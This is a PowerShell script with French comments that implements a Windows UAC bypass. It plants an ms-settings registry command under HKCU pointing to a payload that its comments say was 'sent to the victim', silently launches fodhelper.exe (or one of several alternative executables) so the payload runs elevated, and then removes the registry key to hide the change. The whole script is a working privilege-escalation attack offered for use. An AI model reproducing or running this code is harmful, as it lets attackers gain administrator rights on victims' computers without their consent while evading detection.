param(
    [String]$programPath = "c:\users\user_name\payload_emplacement.exe", # Spécifie l'emplacement de notre premier programme envoyé à la victime (Paramètre à modifier)
    [String]$k = "fodhelper"  # Par défaut
)

function CheckUACBypass() {

    Param(
        [String]$programPath,
        [String]$bypassKey
    )

    # Dictionnaire des exécutables de contournement
    $bypassExecutables = @{
        "fodhelper" = "C:\Windows\System32\fodhelper.exe"
        "eventvwr" = "C:\Windows\System32\eventvwr.exe"
        "compmgmt" = "C:\Windows\System32\compmgmt.msc"
        "taskschd" = "C:\Windows\System32\taskschd.msc"
    }

    # Vérifier si la clé d'exécutable de contournement existe
    if (-Not $bypassExecutables.ContainsKey($bypassKey)) {
        Write-Host "The bypass executable key does not exist : $bypassKey"
        return
    }

    $bypassExecutable = $bypassExecutables[$bypassKey]

    # Vérifier si l'exécutable de contournement existe
    if (-Not (Test-Path $bypassExecutable)) {
        Write-Host "The bypass executable does not exist : $bypassExecutable"
        return
    }

    # Créer la structure du registre
    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $programPath -Force

    # Effectuer le contournement
    try {
        Start-Process $bypassExecutable -WindowStyle Hidden
        Write-Host "UAC bypass attempted successfully."
    } catch {
        Write-Host "Error during UAC bypass attempt : $_"
    }

    # Supprimer la structure du registre
    Start-Sleep 3
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
    Write-Host "Registry structure cleaned."
}

# Appeler la fonction pour vérifier le contournement UAC
CheckUACBypass -programPath $programPath -bypassKey $k
